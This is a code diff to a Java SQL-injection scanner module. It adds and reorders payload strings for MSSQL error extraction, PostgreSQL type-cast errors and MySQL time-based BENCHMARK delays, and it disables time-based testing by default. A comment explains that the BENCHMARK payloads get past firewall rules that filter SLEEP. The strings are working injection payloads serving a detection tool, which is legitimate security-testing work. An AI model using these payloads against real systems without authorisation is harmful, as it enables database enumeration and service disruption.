@@ -223,18 +223,25 @@ public class SmartSqliDetector implements ScanModule {
                 "1'/*!OR*/1=1-- -",
         });
         ep.put("MSSQL", new String[]{
-                // CONVERT error extraction
+                // CONVERT error extraction — single-quote prefix
+                "' AND 1=CONVERT(int,(SELECT @@version))-- -",
+                "' AND 1=CONVERT(int,(SELECT DB_NAME()))-- -",
+                "' AND 1=CONVERT(int,(SELECT user))-- -",
+                // CONVERT error extraction — 1' prefix
                 "1' AND 1=CONVERT(int,(SELECT @@version))-- -",
                 "1' AND 1=CONVERT(int,(SELECT DB_NAME()))-- -",
                 "1' AND 1=CONVERT(int,(SELECT user))-- -",
                 "1 AND 1=CONVERT(int,(SELECT @@version))-- -",
                 // MSSQL specific
+                "' AND 1=@@SERVERNAME-- -",
                 "1' AND 1=@@SERVERNAME-- -",
+                "'; EXEC xp_msver-- -",
                 "1'; EXEC xp_msver-- -",
         });
         ep.put("PostgreSQL", new String[]{
                 // PostgreSQL error extraction
                 "' AND 1=1/(SELECT 0 FROM pg_sleep(0))-- -",
+                "' AND 1::int=2::text-- -",
                 "1' AND 1::int=2::text-- -",
         });
         ep.put("Oracle", new String[]{
@@ -275,10 +282,6 @@ public class SmartSqliDetector implements ScanModule {
                 "1' AND (SELECT SLEEP(18))-- -",
                 "' AND (SELECT * FROM (SELECT SLEEP(18))a)-- -",
                 "1' AND (SELECT * FROM (SELECT(SLEEP(18)))a)-- -",
-                // BENCHMARK alternative (when SLEEP is disabled)
-                "' AND BENCHMARK(10000000,SHA1('test'))-- -",
-                "1' AND BENCHMARK(10000000,SHA1('test'))-- -",
-                "' AND BENCHMARK(5000000,MD5('test'))-- -",
                 // SLEEP in UNION
                 "' UNION SELECT SLEEP(18)-- -",
                 "' UNION SELECT SLEEP(18),NULL-- -",
@@ -296,6 +299,14 @@ public class SmartSqliDetector implements ScanModule {
                 // Stacked query with SLEEP
                 "'; SELECT SLEEP(18)-- -",
                 "1'; SELECT SLEEP(18)-- -",
+                // BENCHMARK fallback — tried last, after all SLEEP variants fail.
+                // SLEEP is sometimes blacklisted by WAF rules; BENCHMARK achieves the same
+                // delay via CPU computation and is less commonly filtered.
+                "' AND BENCHMARK(10000000,SHA1('test'))-- -",
+                "1' AND BENCHMARK(10000000,SHA1('test'))-- -",
+                "' AND BENCHMARK(5000000,MD5('test'))-- -",
+                "' AND IF(1=1,BENCHMARK(10000000,SHA1('test')),0)-- -",
+                "1' AND IF(1=1,BENCHMARK(10000000,SHA1('test')),0)-- -",
         });
         tp.put("PostgreSQL", new String[]{
                 // Basic PG_SLEEP
@@ -870,7 +881,7 @@ public class SmartSqliDetector implements ScanModule {
             // Phase 8: Time-based blind (LAST — serialized via TimingLock)
             // Gated by global TimingLock.isEnabled() checkbox AND per-module config
             if (oobConfirmedParams.contains(ip.name)) return;
-            if (TimingLock.isEnabled() && config.getBool("sqli.time.enabled", true)) {
+            if (TimingLock.isEnabled() && config.getBool("sqli.time.enabled", false)) {
                 try {
                     TimingLock.acquire();
                     testTimeBased(original, ip, baselineTime, detectedDbms);
